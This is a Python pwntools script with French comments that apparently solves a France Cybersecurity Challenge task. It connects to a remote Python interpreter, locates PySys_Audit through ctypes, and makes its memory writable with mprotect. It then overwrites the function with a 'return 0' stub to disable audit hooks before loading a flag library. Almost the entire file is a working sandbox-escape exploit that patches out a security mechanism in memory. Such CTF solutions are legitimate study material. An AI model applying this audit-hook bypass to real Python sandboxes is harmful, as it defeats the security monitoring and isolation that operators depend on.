# coding: utf-8
from pwn import *


context.arch = "amd64"

# envoie une commande à l'intepreteur python distant 
# et affiche son résultat s'il y en a un
def execCmd(cmd):
	res = p.recvuntil(">>> ")
	if len(res)>4:
		log.success("got  :"+res[3:])
	log.info("exec :\n"+cmd)
	p.send(cmd+"\n")


p = remote("challenges1.france-cybersecurity-challenge.fr", 4005)

# on importe les lib necessaires
execCmd("import sys, ctypes, os")

# import de la libc grace aux ctypes python.
# c'est le seul import de ce type autorisé, 
# avec None en parametre à la place du nom de la librairie
execCmd("libc = ctypes.CDLL(None, use_last_error=True, use_errno=True)")

# on récupère l'addresse de la fonction PySys_Audit
execCmd("p = ctypes.create_string_buffer(0x10)")
execCmd("ctypes.memmove(p, ctypes.addressof(ctypes.pythonapi.PySys_Audit), 0x10)")

# fonction permetant la conversion d'une addresse mémoire 
# reçue sous la forme de chaine de caractères vers un entier.
# cf. librairie binascii de python, non importable ici
HexFunct='''def hexlify(data):
	out=0;
	for char in data[::-1]:
		out*=0x100; out+=char
	return out
'''
execCmd(HexFunct)

execCmd("TargetFunction = hexlify(p.value)")

# ce code assembleur est l'équivalent de "return 0" en C
patch = asm("xor rax,rax; ret")

cmd="patch = bytes(["
for char in patch:
	cmd += "0x{:02x}, ".format(ord(char))
cmd = cmd[:-2]
cmd += "])"

execCmd(cmd)

# on retire la protection de la mémoire de la librairie python
# afin qu'elle soit accessible en écriture
# pour info :
# mprotect : 0x17c440 correspond à l'offset de la fonction PySys_Audit par rapport à la base de sa lib
# 5416192 est la taille de lib_flag.so avec un ls -l
# 7 : Read+Write+Execute
execCmd("libc.mprotect(ctypes.c_long(TargetFunction - 0x17c440), 5416192, 7)")

# patch
execCmd("ctypes.memmove(TargetFunction, patch, len(patch))")

# import de la lib et affichage du flag.
execCmd("ctypes.CDLL(\"lib_flag.so\").print_flag()")

p.interactive()

p.close()

